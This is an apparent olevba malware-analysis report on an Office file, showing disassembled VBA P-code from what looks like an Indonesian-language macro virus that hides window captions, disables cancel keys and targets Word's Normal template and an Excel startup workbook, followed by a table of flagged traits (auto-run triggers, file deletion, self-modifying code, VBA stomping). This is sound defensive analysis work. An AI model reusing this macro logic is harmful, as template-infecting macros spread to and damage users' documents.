' 	LitDI2 0x0003 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #393:
' 	EndSelect 
' Line #394:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #395:
' 	Ld Timer 
' 	St Waktu 
' Line #396:
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	Ld Akhir 
' 	Le 
' 	Paren 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	LitDI2 0x0000 
' 	Ge 
' 	And 
' 	DoWhile 
' Line #397:
' 	LitDI2 0x0000 
' 	ArgsLd strPesan 0x0001 
' 	Ld Msg 
' 	ArgsCall Pesan 0x0002 
' Line #398:
' 	LitDI2 0x0001 
' 	ArgsLd strPesan 0x0001 
' 	Ld Msg 
' 	ArgsCall Pesan 0x0002 
' Line #399:
' 	LitDI2 0x0005 
' 	ArgsLd strPesan 0x0001 
' 	Ld Msg 
' 	ArgsCall Pesan 0x0002 
' Line #400:
' 	Loop 
' Line #401:
' 	EndSub 
' Line #402:
' 	FuncDefn (Function Tator() As Boolean)
' Line #403:
' 	Ld KeyWord 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld GetCreator 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Tator 
' 	EndIf 
' Line #404:
' 	EndFunc 
' Line #405:
' 	FuncDefn (Sub ShowMe())
' Line #406:
' 	Dim 
' 	VarDefn Maks
' 	VarDefn Min (As Integer)
' Line #407:
' 	OnError (Resume Next) 
' Line #408:
' 	Ld Tator 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #409:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #410:
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	St Caption 
' Line #411:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	IfBlock 
' Line #412:
' 	LitDI2 0x0001 
' 	St Maks 
' Line #413:
' 	LitStr 0x0001 " "
' 	Ld Application 
' 	MemSt Caption 
' Line #414:
' 	Ld Windows 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveWindow 
' 	Set actWindow 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld Application 
' 	Set actWindow 
' 	EndIf 
' Line #415:
' 	ElseBlock 
' Line #416:
' 	SetStmt 
' 	Ld Application 
' 	Set actWindow 
' Line #417:
' 	LitStr 0x0000 ""
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #418:
' 	LitDI2 0x1029 
' 	UMi 
' 	St Maks 
' Line #419:
' 	EndIfBlock 
' Line #420:
' 	Ld Maks 
' 	Ld Application 
' 	MemSt WindowState 
' Line #421:
' 	Ld Maks 
' 	Ld actWindow 
' 	MemSt WindowState 
' Line #422:
' 	Ld actWindow 
' 	ArgsCall Message 0x0001 
' Line #423:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #424:
' 	Ld Caption 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #425:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt Caption 
' Line #426:
' 	EndIfBlock 
' Line #427:
' 	EndSub 
' Line #428:
' 	FuncDefn (Sub Aplikasi())
' Line #429:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Doc 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Xls 0x0000 
' 	EndIf 
' Line #430:
' 	EndSub 
' Line #431:
' 	FuncDefn (Sub Doc())
' Line #432:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St TempPath 
' Line #433:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Active 
' Line #434:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Temp 
' Line #435:
' 	EndSub 
' Line #436:
' 	FuncDefn (Sub Xls())
' Line #437:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set Active 
' Line #438:
' 	SetStmt 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Set Temp 
' Line #439:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St TempPath 
' Line #440:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Register            |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

